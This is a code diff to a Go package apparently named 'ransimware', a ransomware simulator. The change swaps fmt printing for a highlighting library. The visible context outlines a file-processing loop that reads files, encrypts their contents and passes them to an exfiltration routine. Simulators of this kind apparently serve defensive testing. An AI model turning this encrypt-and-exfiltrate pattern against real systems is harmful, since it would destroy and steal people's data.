@@ -2,7 +2,6 @@ package ransimware
 
 import (
 	"crypto/rand"
-	"fmt"
 	"io/fs"
 	"io/ioutil"
 	"os"
@@ -10,6 +9,7 @@ import (
 	"regexp"
 	"time"
 
+	hl "gitlab.com/mjwhitta/hilighter"
 	"gitlab.com/mjwhitta/pathname"
 	"gitlab.com/mjwhitta/safety"
 	tp "gitlab.com/mjwhitta/threadpool"
@@ -98,14 +98,14 @@ func (s *Simulator) processFile(tid int, data tp.ThreadData) {
 	s.last[tid] = wait(s.last[tid], s.WaitEvery, s.WaitFor)
 
 	if f, e = os.Open(path); e != nil {
-		fmt.Println(e.Error())
+		hl.Println(e.Error())
 		return
 	}
 	defer f.Close()
 
 	// Read file
 	if contents, e = ioutil.ReadAll(f); e != nil {
-		fmt.Println(e.Error())
+		hl.Println(e.Error())
 		return
 	}
 
@@ -119,7 +119,7 @@ func (s *Simulator) processFile(tid int, data tp.ThreadData) {
 
 	// Encrypt contents
 	if tmp, e = s.Encrypt(path, contents); e != nil {
-		fmt.Println(e.Error())
+		hl.Println(e.Error())
 		tmp = contents
 	}
 
@@ -140,7 +140,7 @@ func (s *Simulator) processFile(tid int, data tp.ThreadData) {
 		}
 
 		if e = s.Exfil(path, tmp); e != nil {
-			fmt.Println(e.Error())
+			hl.Println(e.Error())
 		}
 	}
 }
@@ -151,7 +151,7 @@ func (s *Simulator) Target(path string) error {
 
 	// Ensure path exists
 	if !pathname.DoesExist(path) {
-		return fmt.Errorf("Path %s does not exist", path)
+		return hl.Errorf("ransimware: path %s does not exist", path)
 	}
 
 	if path, e = filepath.Abs(path); e != nil {
@@ -239,7 +239,7 @@ func (s *Simulator) Run() error {
 			},
 		)
 		if e != nil {
-			fmt.Println(e.Error())
+			hl.Println(e.Error())
 		}
 	}
 
